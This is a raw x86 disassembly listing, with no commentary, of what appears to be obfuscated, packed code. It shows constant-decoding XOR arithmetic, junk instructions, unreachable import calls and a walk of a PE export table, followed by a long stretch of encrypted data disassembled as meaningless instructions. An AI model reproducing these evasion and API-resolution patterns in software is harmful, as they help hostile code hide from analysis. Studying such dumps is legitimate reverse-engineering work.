  40d809:	mov    ecx,DWORD PTR ds:0x43778b
  40d80f:	inc    ecx
  40d810:	mov    DWORD PTR ds:0x43778b,ecx
  40d816:	cmp    DWORD PTR ds:0x43778b,0x19
  40d81d:	jb     0x40d7d1
  40d823:	xor    eax,0x75108b5
  40d828:	xor    DWORD PTR ds:0x43771b,0x4377a3
  40d832:	add    eax,0x3272fb
  40d837:	mov    ecx,DWORD PTR ds:0x43771b
  40d83d:	mov    ecx,DWORD PTR [ebp-0x54]
  40d840:	cmp    DWORD PTR [ecx+0x54],eax
  40d843:	je     0x40d85e
  40d849:	mov    eax,DWORD PTR [ebp-0x54]
  40d84c:	mov    DWORD PTR ds:0x437723,0x3d6
  40d856:	mov    DWORD PTR [ebp-0x5c],eax
  40d859:	jmp    0x40d8b7
  40d85e:	sbb    eax,DWORD PTR ds:0x437797
  40d864:	mov    eax,DWORD PTR [ebp-0x50]
  40d867:	adc    DWORD PTR ds:0x43772b,0x43775b
  40d871:	xor    eax,0x75108b5
  40d876:	add    eax,0x3272fb
  40d87b:	mov    DWORD PTR ds:0x437723,0x699f
  40d885:	mov    DWORD PTR [ebp-0x5c],eax
  40d888:	jmp    0x40d8b7
  40d88d:	mov    eax,ds:0x4377ab
  40d892:	sbb    eax,DWORD PTR ds:0x437777
  40d898:	mov    ds:0x4377ab,eax
  40d89d:	mov    eax,DWORD PTR [ebp-0x50]
  40d8a0:	and    DWORD PTR ds:0x437727,0x192e
  40d8aa:	xor    eax,0x75108b5
  40d8af:	add    eax,0x3272fb
  40d8b4:	mov    DWORD PTR [ebp-0x5c],eax
  40d8b7:	and    DWORD PTR ds:0x4377bb,edx
  40d8bd:	mov    eax,DWORD PTR [ebp-0x5c]
  40d8c0:	mov    DWORD PTR [ebp-0x18],eax
  40d8c3:	sbb    DWORD PTR ds:0x437743,0x1fc4
  40d8cd:	mov    eax,DWORD PTR [ebp-0x3c]
  40d8d0:	add    DWORD PTR ds:0x43774b,0x43776f
  40d8da:	xor    eax,0x75108b5
  40d8df:	add    eax,0x3272fb
  40d8e4:	mov    DWORD PTR ds:0x437737,0x3ad8
  40d8ee:	cmp    DWORD PTR [ebp-0x18],eax
  40d8f1:	mov    DWORD PTR ds:0x43779b,0x476a
  40d8fb:	jne    0x40d940
  40d901:	adc    DWORD PTR ds:0x43771f,0x22a8
  40d90b:	mov    eax,DWORD PTR [ebp-0x3c]
  40d90e:	sbb    DWORD PTR ds:0x437777,0x437773
  40d918:	xor    eax,0x75108b5
  40d91d:	sub    DWORD PTR ds:0x43770f,0x715d
  40d927:	add    eax,0x3272fb
  40d92c:	mov    DWORD PTR ds:0x43774f,0x301
  40d936:	jmp    0x414dde
  40d93b:	jmp    0x40de5d
  40d940:	and    DWORD PTR ds:0x43779b,0x0
  40d94a:	jmp    0x40d95d
  40d94f:	xor    eax,eax
  40d951:	or     eax,DWORD PTR ds:0x43779b
  40d957:	inc    eax
  40d958:	mov    ds:0x43779b,eax
  40d95d:	cmp    DWORD PTR ds:0x43779b,0x10
  40d964:	jae    0x40d996
  40d96a:	cmp    DWORD PTR ds:0x43779b,0x1d
  40d971:	jbe    0x40d996
  40d977:	jmp    0x40d991
  40d97c:	push   0x43773f
  40d981:	push   0x437777
  40d986:	push   0x3430
  40d98b:	call   DWORD PTR ds:0x43c9b4
  40d991:	jmp    0x40d94f
  40d996:	mov    eax,DWORD PTR [ebp-0x18]
  40d999:	mov    DWORD PTR [ebp-0x7c],eax
  40d99c:	mov    eax,DWORD PTR [ebp+0x8]
  40d99f:	mov    DWORD PTR [ebp-0x78],eax
  40d9a2:	add    eax,0x76e2
  40d9a7:	mov    DWORD PTR [ebp-0x60],0xf89c85b0
  40d9ae:	add    edx,eax
  40d9b0:	mov    DWORD PTR [ebp-0x64],0xf89c85b3
  40d9b7:	mov    eax,DWORD PTR [ebp-0x7c]
  40d9ba:	mov    ecx,DWORD PTR [ebp-0x64]
  40d9bd:	adc    DWORD PTR ds:0x43773f,0x7640
  40d9c7:	xor    ecx,0x75108b5
  40d9cd:	add    ecx,0x3272fb
  40d9d3:	and    DWORD PTR ds:0x43779b,0x0
  40d9dd:	jmp    0x40d9ef
  40d9e2:	mov    edx,DWORD PTR ds:0x43779b
  40d9e8:	inc    edx
  40d9e9:	mov    DWORD PTR ds:0x43779b,edx
  40d9ef:	cmp    DWORD PTR ds:0x43779b,0x17
  40d9f6:	jae    0x40da40
  40d9fc:	cmp    DWORD PTR ds:0x43779b,0xa
  40da03:	ja     0x40da40
  40da09:	jmp    0x40da21
  40da0e:	push   DWORD PTR [ebp-0x1c]
  40da11:	push   0x43779b
  40da16:	push   0x437124
  40da1b:	call   DWORD PTR ds:0x43c9b8
  40da21:	cmp    DWORD PTR ds:0x43779b,0x9
  40da28:	jne    0x40da3b
  40da2e:	mov    edx,DWORD PTR ds:0x43779b
  40da34:	inc    edx
  40da35:	mov    DWORD PTR ds:0x43779b,edx
  40da3b:	jmp    0x40d9e2
  40da40:	mov    edx,DWORD PTR [ebp-0x60]
  40da43:	xor    edx,0x75108b5
  40da49:	add    edx,0x3272fb
  40da4f:	xor    DWORD PTR ds:0x43777f,0x437757
  40da59:	imul   ecx,edx
  40da5c:	cmp    eax,ecx
  40da5e:	mov    DWORD PTR ds:0x437747,0x39af
  40da68:	jne    0x40dadd
  40da6e:	sbb    eax,eax
  40da70:	mov    eax,DWORD PTR [ebp-0x64]
  40da73:	sub    DWORD PTR ds:0x43779b,ebx
  40da79:	xor    eax,0x75108b5
  40da7e:	movzx  ecx,BYTE PTR ds:0x43773f
  40da85:	add    DWORD PTR ds:0x437767,ecx
  40da8b:	add    eax,0x3272fb
  40da90:	add    DWORD PTR ds:0x437727,ecx
  40da96:	mov    ecx,DWORD PTR [ebp-0x60]
  40da99:	xor    ecx,0x75108b5
  40da9f:	and    DWORD PTR ds:0x437793,0x4377b7
  40daa9:	add    ecx,0x3272fb
  40daaf:	and    DWORD PTR ds:0x43770f,0x10c
  40dab9:	imul   eax,ecx
  40dabc:	mov    DWORD PTR ds:0x43778f,0x70da
  40dac6:	mov    DWORD PTR [ebp-0x80],eax
  40dac9:	mov    DWORD PTR ds:0x43772b,0x2b15
  40dad3:	jmp    0x40de20
  40dad8:	jmp    0x40de00
  40dadd:	lea    eax,[ebp-0x70]
  40dae0:	mov    DWORD PTR ds:0x43779b,0x12
  40daea:	cmp    DWORD PTR ds:0x43779b,0x0
  40daf1:	je     0x40db28
  40daf7:	cmp    DWORD PTR ds:0x43779b,0x1e
  40dafe:	jbe    0x40db28
  40db04:	jmp    0x40db14
  40db09:	push   0x8f8f
  40db0e:	call   DWORD PTR ds:0x43c9bc
  40db14:	xor    ecx,ecx
  40db16:	add    ecx,DWORD PTR ds:0x43779b
  40db1c:	dec    ecx
  40db1d:	mov    DWORD PTR ds:0x43779b,ecx
  40db23:	jmp    0x40daea
  40db28:	mov    DWORD PTR [ebp-0x6c],eax
  40db2b:	mov    DWORD PTR ds:0x437753,0x63cd
  40db35:	mov    eax,DWORD PTR [ebp-0x6c]
  40db38:	mov    DWORD PTR [eax],0xf89c85b0
  40db3e:	mov    edx,DWORD PTR ds:0x43771f
  40db44:	sub    DWORD PTR ds:0x43771b,edx
  40db4a:	mov    eax,DWORD PTR [ebp-0x70]
  40db4d:	xor    eax,0x75108b5
  40db52:	and    DWORD PTR ds:0x4377b3,0x0
  40db5c:	jmp    0x40db6e
  40db61:	mov    edx,DWORD PTR ds:0x4377b3
  40db67:	inc    edx
  40db68:	mov    DWORD PTR ds:0x4377b3,edx
  40db6e:	cmp    DWORD PTR ds:0x4377b3,0x1b
  40db75:	jae    0x40db9b
  40db7b:	cmp    DWORD PTR ds:0x4377b3,0x27
  40db82:	jl     0x40db9b
  40db88:	jmp    0x40db96
  40db8d:	push   DWORD PTR [ebp-0x24]
  40db90:	call   DWORD PTR ds:0x43c9c4
  40db96:	jmp    0x40db61
  40db9b:	mov    ecx,DWORD PTR [ebp-0x7c]
  40db9e:	mov    DWORD PTR ds:0x437737,0x11
  40dba8:	cmp    DWORD PTR ds:0x437737,0x0
  40dbaf:	je     0x40dc08
  40dbb5:	cmp    DWORD PTR ds:0x437737,0x4
  40dbbc:	jbe    0x40dc08
  40dbc2:	jmp    0x40dbda
  40dbc7:	push   0x43713c
  40dbcc:	push   0x437104
  40dbd1:	push   DWORD PTR [ebp-0x1c]
  40dbd4:	call   DWORD PTR ds:0x43c9c8
  40dbda:	cmp    DWORD PTR ds:0x437737,0x5
  40dbe1:	jne    0x40dbf6
  40dbe7:	xor    edx,edx
  40dbe9:	add    edx,DWORD PTR ds:0x437737
  40dbef:	dec    edx
  40dbf0:	mov    DWORD PTR ds:0x437737,edx
  40dbf6:	mov    edx,DWORD PTR ds:0x437737
  40dbfc:	dec    edx
  40dbfd:	mov    DWORD PTR ds:0x437737,edx
  40dc03:	jmp    0x40dba8
  40dc08:	mov    eax,DWORD PTR [ecx+eax*8+0x1939850]
  40dc0f:	mov    DWORD PTR [ebp-0x68],eax
  40dc12:	and    ecx,DWORD PTR ds:0x43776b
  40dc18:	mov    eax,DWORD PTR [ebp-0x68]
  40dc1b:	mov    ecx,DWORD PTR [ebp-0x64]
  40dc1e:	sbb    DWORD PTR ds:0x43778b,0x5d76
  40dc28:	xor    ecx,0x75108b5
  40dc2e:	add    ecx,0x3272fb
  40dc34:	mov    edx,DWORD PTR [ebp-0x60]
  40dc37:	sub    DWORD PTR ds:0x43776f,0x437717
  40dc41:	xor    edx,0x75108b5
  40dc47:	add    edx,0x3272fb
  40dc4d:	adc    DWORD PTR ds:0x437733,0x2ce3
  40dc57:	imul   ecx,edx
  40dc5a:	mov    DWORD PTR ds:0x4377a3,0x769c
  40dc64:	cmp    eax,ecx
  40dc66:	mov    DWORD PTR ds:0x437773,0x7b44
  40dc70:	je     0x40dcd1
  40dc76:	mov    eax,DWORD PTR [ebp-0x64]
  40dc79:	sbb    DWORD PTR ds:0x43778b,0x52d3
  40dc83:	xor    eax,0x75108b5
  40dc88:	add    DWORD PTR ds:0x437793,0x279
  40dc92:	add    eax,0x3272fb
  40dc97:	mov    ecx,DWORD PTR [ebp-0x68]
  40dc9a:	imul   eax,ecx
  40dc9d:	add    DWORD PTR ds:0x4377bb,0x1ffc
  40dca7:	add    eax,DWORD PTR [ebp-0x78]
  40dcaa:	mov    DWORD PTR [ebp-0x74],eax
  40dcad:	mov    eax,DWORD PTR [ebp-0x74]
  40dcb0:	mov    DWORD PTR ds:0x43772f,0x1a32
  40dcba:	mov    DWORD PTR [ebp-0x80],eax
  40dcbd:	mov    DWORD PTR ds:0x43773f,0x4cc2
  40dcc7:	jmp    0x40de20
  40dccc:	jmp    0x40ddc7
  40dcd1:	mov    DWORD PTR ds:0x437743,0x12
  40dcdb:	cmp    DWORD PTR ds:0x437743,0x0
  40dce2:	je     0x40dd20
  40dce8:	cmp    DWORD PTR ds:0x437743,0x1f
  40dcef:	jbe    0x40dd20
  40dcf5:	jmp    0x40dd10
  40dcfa:	push   0x3dfe
  40dcff:	push   DWORD PTR [ebp-0x18]
  40dd02:	push   DWORD PTR [ebp-0x28]
  40dd05:	push   0x437000
  40dd0a:	call   DWORD PTR ds:0x43c9cc
  40dd10:	mov    eax,ds:0x437743
  40dd15:	dec    eax
  40dd16:	mov    ds:0x437743,eax
  40dd1b:	jmp    0x40dcdb
  40dd20:	mov    eax,DWORD PTR [ebp-0x64]
  40dd23:	dec    ecx
  40dd24:	xor    eax,0x75108b5
  40dd29:	adc    ecx,DWORD PTR ds:0x43779f
  40dd2f:	add    eax,0x3272fb
  40dd34:	and    DWORD PTR ds:0x43771f,0x0
  40dd3e:	mov    ecx,DWORD PTR ds:0x43771f
  40dd44:	inc    ecx
  40dd45:	mov    DWORD PTR ds:0x43771f,ecx
  40dd4b:	cmp    DWORD PTR ds:0x43771f,0x27
  40dd52:	jg     0x40dd8f
  40dd58:	jmp    0x40dd82
  40dd5d:	push   DWORD PTR [ebp-0xc]
  40dd60:	push   0x6584
  40dd65:	push   0x4377af
  40dd6a:	push   DWORD PTR [ebp-0x24]
  40dd6d:	push   0x1eb1
  40dd72:	push   0x5818
  40dd77:	push   0x1de6
  40dd7c:	call   DWORD PTR ds:0x43c9d0
  40dd82:	cmp    DWORD PTR ds:0x43771f,0x1c
  40dd89:	jb     0x40dd3e
  40dd8f:	mov    ecx,DWORD PTR [ebp-0x60]
  40dd92:	xor    ecx,0x75108b5
  40dd98:	xor    DWORD PTR ds:0x437713,0x26bd
  40dda2:	add    ecx,0x3272fb
  40dda8:	imul   eax,ecx
  40ddab:	mov    DWORD PTR ds:0x43778b,0x2ea1
  40ddb5:	mov    DWORD PTR [ebp-0x80],eax
  40ddb8:	mov    DWORD PTR ds:0x43778b,0x4108
  40ddc2:	jmp    0x40de20
  40ddc7:	sub    DWORD PTR ds:0x43778b,edx
  40ddcd:	mov    eax,DWORD PTR [ebp-0x60]
  40ddd0:	xor    DWORD PTR ds:0x437747,0x2583
  40ddda:	xor    eax,0x75108b5
  40dddf:	xor    DWORD PTR ds:0x43779b,0x437773
  40dde9:	add    eax,0x3272fb
  40ddee:	mov    DWORD PTR ds:0x43779b,0x27ba
  40ddf8:	mov    DWORD PTR [ebp-0x80],eax
  40ddfb:	jmp    0x40de20
  40de00:	sub    DWORD PTR ds:0x43777f,edi
  40de06:	mov    eax,DWORD PTR [ebp-0x60]
  40de09:	xor    eax,0x75108b5
  40de0e:	add    eax,0x3272fb
  40de13:	sbb    DWORD PTR ds:0x43771f,0x437737
  40de1d:	mov    DWORD PTR [ebp-0x80],eax
  40de20:	and    eax,DWORD PTR ds:0x437793
  40de26:	mov    eax,DWORD PTR [ebp-0x80]
  40de29:	mov    DWORD PTR [ebp-0x30],eax
  40de2c:	mov    eax,DWORD PTR [ebp-0x3c]
  40de2f:	xor    eax,0x75108b5
  40de34:	add    eax,0x3272fb
  40de39:	cmp    DWORD PTR [ebp-0x30],eax
  40de3c:	jne    0x40de54
  40de42:	mov    eax,DWORD PTR [ebp-0x3c]
  40de45:	xor    eax,0x75108b5
  40de4a:	add    eax,0x3272fb
  40de4f:	jmp    0x414dde
  40de54:	mov    eax,DWORD PTR [ebp-0x30]
  40de57:	mov    eax,DWORD PTR [eax+0x18]
  40de5a:	mov    DWORD PTR [ebp-0x4],eax
  40de5d:	mov    eax,DWORD PTR [ebp-0x30]
  40de60:	mov    ecx,DWORD PTR [ebp+0x8]
  40de63:	add    ecx,DWORD PTR [eax+0x20]
  40de66:	mov    DWORD PTR [ebp-0xc],ecx
  40de69:	mov    eax,DWORD PTR [ebp-0x30]
  40de6c:	mov    ecx,DWORD PTR [ebp+0x8]
  40de6f:	add    ecx,DWORD PTR [eax+0x24]
  40de72:	mov    DWORD PTR [ebp-0x24],ecx
  40de75:	mov    eax,DWORD PTR [ebp-0x30]
  40de78:	mov    ecx,DWORD PTR [ebp+0x8]
  40de7b:	add    ecx,DWORD PTR [eax+0x1c]
  40de7e:	mov    DWORD PTR [ebp-0x20],ecx
  40de81:	jmp    0x41023e
  40de86:	mov    eax,DWORD PTR [ebp-0x44]
  40de89:	mov    ecx,DWORD PTR [ebp-0xc]
  40de8c:	mov    edx,DWORD PTR [ebp+0x8]
  40de8f:	jmp    0x410218
  40de94:	in     al,0xfc
  40de96:	xchg   esi,eax
  40de97:	sub    BYTE PTR [esi+0x30],dh
  40de9a:	fs push esp
  40de9c:	jbe    0x40de3b
  40de9e:	jmp    0x40deb3
  40dea0:	jb     0x40de88
  40dea2:	mov    eax,ds:0x7b246eac
  40dea7:	jnp    0x40de90
  40dea9:	cwde   
  40deaa:	jnp    0x40df27
  40deac:	(bad)  
  40dead:	loope  0x40de86
  40deaf:	add    ch,al
  40deb1:	sti    
  40deb2:	(bad)  
  40deb4:	fld    DWORD PTR [edi]
  40deb6:	fucomip st,st(6)
  40deb8:	in     eax,0xb3
  40deba:	out    0xaf,eax
  40debc:	(bad)  
  40debd:	div    ecx
  40debf:	mov    ebx,0xdbccf2c4
  40dec4:	retf   
  40dec5:	add    dh,cl
  40dec7:	loop   0x40dec0
  40dec9:	(bad)  
  40decb:	fdivr  QWORD PTR [ebp+0x5ebd2]
  40ded1:	add    eax,0xcb01dec5
  40ded6:	ror    edx,cl
  40ded8:	mov    bl,0xc5
  40deda:	iret   
  40dedb:	mov    al,0xee
  40dedd:	cmc    
  40dede:	test   al,0xf3
  40dee0:	(bad)  
  40dee1:	fdiv   st,st(4)
  40dee3:	shl    BYTE PTR [esi-0xc2730],1
  40dee9:	mul    eax
  40deeb:	xlat   BYTE PTR ds:[ebx]
  40deec:	add    al,0xc3
  40deee:	sti    
  40deef:	rol    esi,1
  40def1:	push   cs
  40def2:	fmul   st,st(5)
  40def4:	add    edx,esi
  40def6:	iret   
  40def7:	into   
  40def8:	out    0xec,eax
  40defa:	shl    ah,1
  40defc:	(bad)  
  40defd:	mov    dl,0xcc
  40deff:	retf   0xd1e9
  40df02:	mov    dh,0xd4
  40df04:	cld    
  40df05:	in     eax,dx
  40df06:	mov    esi,0xf0cec8ce
  40df0b:	loop   0x40dee1
  40df0d:	ret    
  40df0e:	hlt    
  40df0f:	icebp  
  40df10:	lock (bad) 
  40df13:	add    al,0xe3
  40df15:	fucomip st,st(7)
  40df17:	out    0xbe,eax
  40df19:	retf   
  40df1a:	into   
  40df1b:	lods   al,BYTE PTR ds:[esi]
  40df1c:	lock (bad) 
  40df20:	mov    dl,0xb9
  40df22:	mov    edx,0xf8bccdd9
  40df27:	mov    ecx,0xfcbce0d7
  40df2c:	test   BYTE PTR ds:0xd40bd9dc,0xd5
  40df33:	call   0xbd44f144
  40df38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df39:	lock enter 0xc4d7,0xc6
  40df3e:	mov    ebx,0xdad9f9d7
  40df43:	in     al,dx
  40df44:	clc    
  40df45:	sti    
  40df46:	lock out dx,al
  40df48:	aad    0xe7
  40df4a:	icebp  
  40df4b:	stc    
  40df4c:	icebp  
  40df4d:	push   es
  40df4e:	in     al,0x4
  40df50:	xlat   BYTE PTR ds:[ebx]
  40df51:	clc    
  40df52:	in     eax,dx
  40df53:	pop    es
  40df54:	fmul   st,st(7)
  40df56:	repz sar DWORD PTR [edi-0x150d2313],1
  40df5d:	mov    ch,0xda
  40df5f:	clc    
  40df60:	mov    dl,0xb4
  40df62:	call   0xf52cda41
  40df67:	(bad)  
  40df68:	sar    esp,cl
  40df6a:	hlt    
  40df6b:	idiv   BYTE PTR [ebp-0x1b2e1816]
  40df71:	aam    0xfd
  40df73:	aam    0xea
  40df75:	iret   
  40df76:	add    ecx,ebx
  40df78:	scas   eax,DWORD PTR es:[edi]
  40df79:	mov    edi,0xc4e0cbcf
  40df7e:	jmp    0xf43fa77b
  40df83:	fsubp  st(0),st
  40df85:	xlat   BYTE PTR ds:[ebx]
  40df86:	sti    
  40df87:	mov    edx,0xd6daf4c3
  40df8c:	clc    
  40df8d:	aam    0xfa
  40df8f:	not    esp
  40df91:	out    dx,al
  40df92:	call   0xc841e864
  40df97:	lods   eax,DWORD PTR ds:[esi]
  40df98:	(bad)  [ebx+esi*4-0xa143909]
  40df9f:	into   
  40dfa0:	(bad)  
  40dfa1:	fcomip st,st(3)
  40dfa3:	retf   0xe2c9
  40dfa6:	iret   
  40dfa7:	iret   
  40dfa8:	stc    
  40dfa9:	in     al,dx
  40dfaa:	(bad)  
  40dfab:	hlt    
  40dfac:	in     al,dx
  40dfad:	add    esi,eax
  40dfaf:	(bad)  [ecx]
  40dfb1:	retf   0xf8f6
  40dfb4:	fadd   QWORD PTR [ecx]
  40dfb6:	iret   
  40dfb7:	retf   0xe0e8
  40dfba:	in     eax,dx
  40dfbb:	div    DWORD PTR [edi-0x1f491f0f]
  40dfc1:	out    0xf7,eax
  40dfc3:	(bad)  
  40dfc5:	int3   
  40dfc6:	repnz out dx,al
  40dfc8:	hlt    
  40dfc9:	fcomip st,st(2)
  40dfcb:	sar    ah,cl
  40dfcd:	add    DWORD PTR [ebx],ecx
  40dfcf:	rcl    bh,1
  40dfd1:	retf   0x6e2
  40dfd4:	or     ch,cl
  40dfd6:	push   es
  40dfd7:	jmp    0x40dfbc
  40dfd9:	mov    bl,0xee
  40dfdb:	lods   al,BYTE PTR ds:[esi]
  40dfdc:	mov    bl,0xb2
  40dfde:	mov    ah,0xd2
  40dfe0:	mov    al,0xdf
  40dfe2:	retf   0xecbe
  40dfe5:	leave  
  40dfe6:	int    0xee
  40dfe8:	into   
  40dfe9:	add    ebx,ebx
  40dfeb:	xlat   BYTE PTR ds:[ebx]
  40dfec:	div    ebp
  40dfee:	cmc    
  40dfef:	ret    0xafd
  40dff2:	enter  0xcaf8,0xfc
  40dff6:	stc    
  40dff7:	out    0xb1,al
  40dff9:	icebp  
  40dffa:	shl    DWORD PTR [eax-0x3e0f3149],0xea
  40e001:	(bad)  
  40e002:	idiv   ah
  40e004:	jmp    0xfbe7:0xddd2debf
  40e00b:	shl    esp,1
  40e00d:	(bad)  
  40e00f:	cmc    
  40e010:	(bad)  
  40e012:	out    0x3,al
  40e014:	loopne 0x40dff0
  40e016:	cld    
  40e017:	(bad)
  40e01a:	loop   0x40e00d
  40e01c:	out    0xe0,al
  40e01e:	(bad)  
  40e01f:	(bad)  
  40e020:	enter  0xcdd8,0xd5
  40e024:	in     al,dx
  40e025:	(bad)  
  40e026:	int3   
  40e027:	fdivr  QWORD PTR [esi-0x3a21fa43]
  40e02d:	icebp  
  40e02e:	out    0xc0,eax
  40e030:	ror    BYTE PTR [esi],0xd6
  40e033:	fsubr  st,st(6)
  40e035:	or     eax,DWORD PTR [eax]
  40e037:	lods   al,BYTE PTR ds:[esi]
  40e038:	mov    esp,0xe8c4ebea
  40e03d:	(bad)  
  40e03e:	into   
  40e03f:	mov    ch,0xd4
  40e041:	inc    ebp
  40e043:	int    0xd1
  40e045:	in     eax,dx
  40e046:	rcr    bh,1
  40e048:	stc    
  40e049:	add    bl,dh
  40e04b:	shl    ebp,cl
  40e04d:	ret    0xebf5
  40e050:	or     edi,edx
  40e052:	dec    BYTE PTR [edx]
  40e054:	or     ch,ah
  40e056:	in     eax,dx
  40e057:	jmp    0x40e03f
  40e059:	(bad)  
  40e05b:	stos   DWORD PTR es:[edi],eax
  40e05c:	test   bh,0xca
  40e05f:	fcmovne st,st(5)
  40e061:	call   0xe02fb661
  40e066:	not    eax
  40e068:	ret    
  40e069:	(bad)  
  40e06a:	mov    eax,0xe5bcd102
  40e06f:	ret    
  40e070:	shr    edi,0xf
  40e073:	call   0xd84ca580
  40e078:	out    0xc6,eax
  40e07a:	(bad)  
  40e07b:	loopne 0x40e05d
  40e07d:	mov    cl,0xfa
  40e07f:	enter  0xcfdb,0xd3
  40e083:	in     eax,0xcd
  40e085:	repnz fucomp st(5)
  40e088:	enter  0xfd00,0xc5
  40e08c:	out    0xd1,eax
  40e08e:	fcmovnu st,st(3)
  40e090:	leave  
  40e091:	in     eax,0x8
  40e093:	loope  0x40e0a3
  40e095:	add    al,0xf9
  40e097:	repnz (bad) 
  40e099:	repnz mov ecx,0xcbb3c5c9
  40e0a0:	xlat   BYTE PTR ds:[ebx]
  40e0a1:	repz shl BYTE PTR [esi-0x43034048],1
  40e0a8:	(bad)  
  40e0a9:	icebp  
  40e0aa:	repz shl esp,cl
  40e0ad:	mov    BYTE PTR [ecx+eax*1],0xe8
  40e0b1:	xlat   BYTE PTR ds:[ebx]
  40e0b2:	in     al,0x7
  40e0b4:	(bad)  
  40e0b5:	ficom  DWORD PTR [edx]
  40e0b7:	mov    dl,0xf2
  40e0b9:	retf   
  40e0ba:	shl    BYTE PTR [ecx-0x38281f29],1
  40e0c0:	mov    eax,0xb5dfb4e9
  40e0c5:	in     al,dx
  40e0c6:	aam    0xc1
  40e0c8:	(bad)  
  40e0ca:	fucomip st,st(5)
  40e0cc:	test   ecx,0xf9f0daf5
  40e0d2:	retf   
  40e0d3:	fimul  WORD PTR [ecx]
  40e0d5:	add    edi,esp
  40e0d7:	repnz out dx,eax
  40e0d9:	mov    bh,0xed
  40e0db:	loope  0x40e08e
  40e0dd:	rcl    bh,0xcd
  40e0e0:	aad    0xca
  40e0e2:	fnsetpm(287 only) 
  40e0e4:	sti    
  40e0e5:	repnz add DWORD PTR [esi+edx*8-0xe2d422e],edi
  40e0ed:	icebp  
  40e0ee:	loope  0x40e0f5
  40e0f0:	or     esp,edi
  40e0f2:	fadd   QWORD PTR [edi]
  40e0f4:	retf   0xcf0d
  40e0f7:	(bad)  
  40e0f8:	leave  
  40e0f9:	out    0xf7,eax
  40e0fb:	loop   0x40e0c9
  40e0fd:	retf   
  40e0fe:	mov    ah,0xf2
  40e100:	in     eax,0xff
  40e102:	in     al,0xb4
  40e104:	cli    
  40e105:	(bad)  
  40e106:	(bad)  
  40e107:	push   ebx
  40e109:	mov    edi,0xf0d2d703
  40e10e:	retf   0x4de
  40e111:	add    dh,dl
  40e113:	jmp    0xb1f3:0xddddca0a
  40e11a:	(bad)  
  40e11b:	jmp    0xf02aafd5
  40e120:	div    bh
  40e122:	in     eax,dx
  40e123:	test   esp,0xe7decfc3
  40e129:	in     al,dx
  40e12a:	add    ebx,esp
  40e12c:	div    dl
  40e12e:	(bad)  
  40e12f:	pop    es
  40e130:	stc    
  40e131:	sar    edi,0xfd
  40e134:	fucomip st,st(2)
  40e136:	enter  0xeabc,0xe7
  40e13a:	vpmaxsw xmm5,xmm1,xmm1
  40e13e:	shl    cl,cl
  40e140:	jmp    0x40e140
  40e142:	aad    0xb7
  40e144:	repz lock in eax,dx
  40e147:	rcr    ebp,cl
  40e149:	fcmovne st,st(4)
  40e14b:	clc    
  40e14c:	fild   WORD PTR [eax]
  40e14e:	retf   0xdd07
  40e151:	clc    
  40e152:	hlt    
  40e153:	add    ecx,ebp
  40e155:	out    dx,al
  40e156:	add    ah,dh
  40e158:	(bad)  
  40e15a:	mov    esi,0xd2eadbca
  40e15f:	xlat   BYTE PTR ds:[ebx]
  40e160:	fsub   st,st(7)
  40e162:	rcl    dl,1
  40e164:	mov    eax,0xd4b7bbd6
  40e169:	int3   
  40e16a:	stc    
  40e16b:	mov    ebx,0xe2e6f0d1
  40e170:	shufps xmm3,xmm6,0xf8
  40e174:	std    
  40e175:	jmp    esi
  40e177:	test   al,0xbf
  40e179:	leave  
  40e17a:	mov    dh,0xb3
  40e17c:	aam    0xb1
  40e17e:	mov    bl,0xef
  40e180:	in     eax,0xee
  40e182:	rcr    ecx,cl
  40e184:	fcmovbe st,st(3)
  40e186:	repz neg eax
  40e189:	xlat   BYTE PTR ds:[ebx]
  40e18a:	std    
  40e18b:	in     al,0xc3
  40e18d:	ret    0xe7f9
  40e190:	aam    0xfc
  40e192:	jmp    0x40e17e
  40e194:	bswap  ebx
  40e196:	retf   0xa6e4
  40e199:	loope  0x40e187
  40e19b:	shl    ah,0xcd
  40e19e:	mov    ah,0xd2
  40e1a0:	mov    ecx,0xc8c8dfeb
  40e1a5:	int3   
  40e1a6:	mov    edx,0xdeccdffe
  40e1ab:	in     eax,dx
  40e1ac:	int3   
  40e1ad:	add    dl,dh
  40e1af:	shl    esi,0xf6
  40e1b2:	ror    BYTE PTR [eax],0xe1
  40e1b5:	or     edx,DWORD PTR [ebx]
  40e1b7:	jmp    0xd105ae62
  40e1bc:	mov    esp,0xcdc4c0fb
  40e1c1:	hlt    
  40e1c2:	mov    edx,0xb0f5d3d6
  40e1c7:	ret    0xd5cd
  40e1ca:	push   es
  40e1cb:	add    esi,ebp
  40e1cd:	(bad)  
  40e1cf:	add    eax,DWORD PTR [esi]
  40e1d1:	stc    
  40e1d2:	(bad)  
  40e1d3:	leave  
  40e1d4:	out    dx,al
  40e1d5:	or     ch,cl
  40e1d7:	mov    esp,0xf3e5a9b8
  40e1dc:	mov    dl,0xbb
  40e1de:	in     eax,0xcb
  40e1e0:	mov    ebx,0xdcfcd6fb
  40e1e5:	stc    
  40e1e6:	fcomp  st(6)
  40e1e8:	mov    edx,0xd0f4d4be
  40e1ed:	rcl    esp,cl
  40e1ef:	cld    
  40e1f0:	jecxz  0x40e1cc
  40e1f2:	fucomi st,st(3)
  40e1f4:	pop    es
  40e1f5:	std    
  40e1f6:	out    0xbc,al
  40e1f8:	jecxz  0x40e1d1
  40e1fa:	shl    BYTE PTR [ebp-0x1611372a],1
  40e200:	stc    
  40e201:	repz (bad) 
  40e203:	fcmovnbe st,st(5)
  40e205:	fstp   TBYTE PTR [edi-0xb43f80c]
  40e20b:	stc    
  40e20c:	aam    0xc6
  40e20e:	clc    
  40e20f:	ret    
  40e210:	pop    es
  40e211:	or     ecx,ebp
  40e213:	pop    es
  40e214:	jecxz  0x40e215
  40e216:	add    eax,0xccd0f7c1
  40e21b:	loop   0x40e1e1
  40e21d:	int3   
  40e21e:	call   0xec3999d5
  40e223:	iret   
  40e224:	add    edi,esi
  40e226:	dec    bh
  40e228:	(bad)  
  40e22a:	int    0xf7
  40e22c:	stc    
  40e22d:	push   ebp
  40e22f:	call   0xc929c937
  40e234:	fst    DWORD PTR [edx]
  40e236:	out    0xaf,eax
  40e238:	retf   0xf3ed
  40e23b:	lods   eax,DWORD PTR ds:[esi]
  40e23c:	mov    esp,0xc4b3cde8
  40e241:	in     al,0xb4
  40e243:	div    cl
  40e245:	(bad)  
  40e247:	cld    
  40e248:	rol    DWORD PTR [eax],0xf9
  40e24b:	cmc    
  40e24c:	pop    es
  40e24d:	retf   
  40e24e:	idiv   cl
  40e250:	or     DWORD PTR ds:0x130702fd,eax
  40e256:	push   cs
  40e257:	out    dx,eax
  40e258:	(bad)  
  40e25a:	icebp  
  40e25b:	mov    esp,0xf9f2eac5
  40e260:	mov    ah,0xd9
  40e262:	in     eax,0xba
